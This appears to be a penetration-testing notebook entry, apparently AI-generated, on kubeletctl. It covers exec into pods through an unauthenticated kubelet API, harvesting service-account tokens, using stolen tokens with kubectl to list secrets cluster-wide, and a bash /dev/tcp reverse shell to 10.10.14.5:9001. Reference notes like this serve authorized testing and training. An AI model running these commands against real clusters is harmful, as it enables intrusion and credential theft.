# kubeletctl

**Tags:** #Kubernetes #k8s #kubelet #RCE #cloud

CyberArk's client for the **kubelet API** (port 10250). Where [[Tools/Cloud/kubectl|kubectl]] talks to the central API server, kubeletctl talks directly to a node's kubelet — which, if it allows anonymous auth, lets you list pods and **exec commands inside any container on that node without any API-server credentials**. Its `scan` subcommands sweep every pod on a node for command execution and for readable service-account tokens.

**Source:** https://github.com/cyberark/kubeletctl
**Install:** `go install github.com/cyberark/kubeletctl@latest` or download a release binary.

```bash
kubeletctl pods -s <target>                          # list pods (from the kubelet's view)
kubeletctl runningpods -s <target>                   # alt endpoint — sometimes works when `pods` is blocked
kubeletctl exec "id" -p <pod> -c <container> -s <target>
kubeletctl scan rce -s <target>                      # find every pod you can exec in
kubeletctl scan token -s <target>                    # harvest SA tokens from every pod
```

### The Payoff — Node → Cluster Pivot

`scan token` hands you the service-account tokens mounted in each pod. Take the most
privileged one back to the **API server** with [[Tools/Cloud/kubectl|kubectl]] — if any pod
runs as a high-priv SA, you've jumped from one node to the whole cluster:

```bash
kubectl --server=https://<apiserver>:6443 --token=<stolen-SA-token> --insecure-skip-tls-verify auth can-i --list
kubectl --server=https://<apiserver>:6443 --token=<stolen-SA-token> --insecure-skip-tls-verify get secrets -A
# a reverse shell via kubelet exec instead of `id`:
kubeletctl exec "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'" -p <pod> -c <container> -s <target>
```

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Cloud & Data/Kubernetes|Kubernetes]] — the Kubelet API (10250) exec section.
> Related tooling: [[Tools/Cloud/kubectl|kubectl]], [[Tools/Cloud/peirates|peirates]].

---

*Created: 2026-09-22*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
